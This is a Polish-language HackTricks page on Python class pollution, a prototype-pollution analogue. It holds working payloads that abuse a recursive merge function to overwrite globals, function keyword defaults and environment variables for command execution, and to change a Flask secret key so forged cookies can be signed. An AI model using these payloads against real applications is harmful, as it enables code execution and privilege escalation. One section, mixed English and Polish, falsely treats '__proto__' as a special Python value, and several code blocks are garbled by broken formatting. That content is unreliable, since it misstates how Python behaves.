# Class Pollution (Python's Prototype Pollution)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowy przykład

Sprawdź, jak możliwe jest zanieczyszczenie klas obiektów za pomocą ciągów znaków:

```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```

## Podstawowy przykład podatności

Consider the following Python code:

Rozważ następujący kod Pythona:

```python
class Person:
    def __init__(self, name):
        self.name = name

person = Person("Alice")
print(person.name)
```

This code defines a `Person` class with a constructor that takes a `name` parameter and assigns it to the `name` attribute of the object. An instance of the `Person` class is created with the name "Alice" and the `name` attribute is printed.

Ten kod definiuje klasę `Person` z konstruktorem, który przyjmuje parametr `name` i przypisuje go do atrybutu `name` obiektu. Tworzony jest egzemplarz klasy `Person` o nazwie "Alice", a następnie drukowany jest atrybut `name`.

Now, let's say an attacker can control the `name` parameter passed to the constructor:

Teraz, załóżmy, że atakujący może kontrolować parametr `name` przekazywany do konstruktora:

```python
class Person:
    def __init__(self, name):
        self.name = name

person = Person("__proto__")
print(person.name)
```

In this modified code, the `name` parameter passed to the constructor is `__proto__`. This is a special value in Python that can be used to modify the behavior of objects. When the `name` attribute is accessed, it will actually look for a property named `name` in the object's prototype chain.

W tym zmodyfikowanym kodzie parametr `name` przekazywany do konstruktora to `__proto__`. Jest to specjalna wartość w Pythonie, która może być używana do modyfikowania zachowania obiektów. Gdy dostępny jest atrybut `name`, faktycznie poszukiwane jest właściwości o nazwie `name` w łańcuchu prototypów obiektu.

An attacker can take advantage of this behavior to pollute the prototype of the `Person` class and modify its behavior:

Atakujący może wykorzystać to zachowanie, aby zanieczyścić prototyp klasy `Person` i zmienić jej zachowanie:

```python
class Person:
    def __init__(self, name):
        self.name = name

person = Person("__proto__")
Person.__proto__.leak = lambda self: print("Leaked!")
person.leak()
```

In this example, the attacker sets the `leak` property on the `__proto__` object of the `Person` class. This property is a lambda function that prints "Leaked!". When the `leak` method is called on the `person` object, it will execute the lambda function and print the message.

W tym przykładzie atakujący ustawia właściwość `leak` na obiekcie `__proto__` klasy `Person`. Ta właściwość jest funkcją lambda, która drukuje "Leaked!". Gdy metoda `leak` jest wywoływana na obiekcie `person`, zostanie wykonana funkcja lambda i wydrukowany zostanie komunikat.

This is a basic example of class pollution, where an attacker can modify the behavior of a class by polluting its prototype. Class pollution can lead to various security vulnerabilities, such as code execution, information leakage, or privilege escalation.

To jest podstawowy przykład zanieczyszczenia klasy, w którym atakujący może zmodyfikować zachowanie klasy poprzez zanieczyszczenie jej prototypu. Zanieczyszczenie klasy może prowadzić do różnych podatności bezpieczeństwa, takich jak wykonanie kodu, wyciek informacji lub eskalacja uprawnień.

```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```

## Przykłady narzędzi

<details>

<summary>Tworzenie domyślnej wartości właściwości klasy do RCE (subprocess)</summary>

\`\`\`python from os import popen class Employee: pass # Creating an empty class class HR(Employee): pass # Class inherits from Employee class class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class def execute\_command(self): command = self.custom\_command if hasattr(self, 'custom\_command') else 'echo Hello there' return f'\[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):

## Recursive merge function

for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)

USER\_INPUT = { "**class**":{ "**base**":{ "**base**":{ "custom\_command": "whoami" } } } }

recruiter\_emp = Recruiter() system\_admin\_emp = SystemAdmin()

print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "echo Hello there", output: "Hello there"

## Create default value for Employee.custom\_command

merge(USER\_INPUT, recruiter\_emp)

print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "whoami", output: "abdulrah33m"

````
</details>

<details>

<summary>Zanieczyszczanie innych klas i zmiennych globalnych za pomocą <code>globals</code></summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
````

</details>

<details>

<summary>Arbitraryzne wykonanie podprocesu</summary>

\`\`\`python import subprocess, json

class Employee: def **init**(self): pass

def merge(src, dst):

## Recursive merge function

for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)

## Overwrite env var "COMSPEC" to execute a calc

USER\_INPUT = json.loads('{"**init**":{"**globals**":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"\}}\}}\}}') # attacker-controlled value

merge(USER\_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up

````
</details>

<details>

<summary>Nadpisywanie <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`** to specjalny atrybut wszystkich funkcji, zgodnie z [dokumentacją](https://docs.python.org/3/library/inspect.html) Pythona, jest to "mapowanie domyślnych wartości dla parametrów **tylko-kluczowych**". Zanieczyszczanie tego atrybutu pozwala nam kontrolować domyślne wartości parametrów tylko-kluczowych funkcji, które są parametrami funkcji po \* lub \*args.
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
````

</details>

<details>

<summary>Nadpisywanie tajemnicy Flask w różnych plikach</summary>

Więc jeśli możesz przeprowadzić zanieczyszczenie klasy nad obiektem zdefiniowanym w głównym pliku Pythona strony internetowej, **którego klasa jest zdefiniowana w innym pliku** niż główny. Ponieważ w celu uzyskania dostępu do \_\_globals\_\_ w poprzednich payloadach musisz uzyskać dostęp do klasy obiektu lub metod klasy, będziesz mógł **uzyskać dostęp do globalnych z tego pliku, ale nie z głównego**.\
Dlatego **nie będziesz w stanie uzyskać dostępu do globalnego obiektu aplikacji Flask**, który zdefiniował **klucz tajny** na stronie głównej:

```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```

W tym scenariuszu potrzebujesz gadżetu do przeglądania plików, aby dotrzeć do głównego pliku i **uzyskać dostęp do globalnego obiektu `app.secret_key`** w celu zmiany tajnego klucza Flask i możliwości [**zwiększenia uprawnień, znając ten klucz**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload taki jak ten [z tego opisu](https://ctftime.org/writeup/36082):

{% code overflow="wrap" %}
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
{% endcode %}

Użyj tego payloadu, aby **zmienić `app.secret_key`** (nazwa w Twojej aplikacji może być inna), aby móc podpisywać nowe i bardziej uprzywilejowane ciasteczka flask.

</details>

Sprawdź również następującą stronę, aby uzyskać więcej tylko do odczytu gadżetów:

{% content-ref url="python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](python-internal-read-gadgets.md)
{% endcontent-ref %}

## Referencje

* [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
